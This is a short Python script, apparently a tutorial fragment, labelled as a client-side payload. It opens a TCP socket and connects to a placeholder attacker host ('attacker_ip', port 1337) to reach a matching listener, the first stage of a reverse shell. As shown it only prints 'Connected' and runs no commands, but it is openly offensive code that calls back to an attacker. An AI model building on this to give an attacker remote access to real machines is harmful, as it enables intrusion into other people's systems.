## payload to be excuted in the client side
import socket

## create the object of socket module
## instantiate payload object with the same constant from listener
payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

## call the connect method on payload
## connect method will take the tuple with 2 arguments same as from listener
payload.connect(("attacker_ip", 1337))

print("Connected")
